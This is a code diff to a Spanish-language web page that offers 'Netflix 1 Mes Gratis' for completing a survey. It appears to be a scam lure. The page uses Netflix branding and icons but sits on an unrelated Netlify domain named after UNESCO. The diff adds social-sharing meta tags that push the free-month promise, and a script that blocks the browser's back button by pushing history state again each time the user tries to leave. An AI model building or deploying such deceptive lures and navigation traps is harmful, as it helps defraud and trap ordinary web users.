@@ -3,8 +3,15 @@
     <head>
         <meta charset="UTF-8" />
         <meta name="viewport" content="width=device-width, initial-scale=1" />
-        <title>Netflix 1 Mes Gratis</title>
+        <title>Netflix 1 Mes Gratis - Reclama ahora</title>
 
+        <meta name="description" content="Completa nuestra encuesta y disfruta 1 mes gratis de Netflix. ¡Rápido, seguro y fácil!">
+        <meta property="og:url" content="https://unesco-encuesta-participa.netlify.app">
+        <meta property="og:type" content="website">
+        <meta property="og:title" content="Netflix 1 Mes Gratis - Reclama ahora">
+        <meta property="og:description" content="Completa nuestra encuesta y disfruta 1 mes gratis de Netflix. ¡Rápido, seguro y fácil!">
+        <meta property="og:image" content="https://unesco-encuesta-participa.netlify.app/images/og2.jpg?v=202590">
+        
         <link rel="shortcut icon" href="/nficon.ico" />
         <link rel="apple-touch-icon" sizes="64x64" href="/images/nficon.png" />
         <link rel="apple-touch-icon" sizes="180x180" href="/images/icon-nf.png"/>
@@ -350,6 +357,16 @@
             
             // Ejecutar al cargar
             document.addEventListener('DOMContentLoaded', iniciar);
+        </script>
+
+        <script>
+            // bloquea atrás
+            window.history.pushState(null, null, window.location.href);
+
+            // intercepta el botón atrás / gestos
+            window.addEventListener('popstate', function() {
+                window.history.pushState(null, null, window.location.href);
+            });
         </script>
         
     </body>
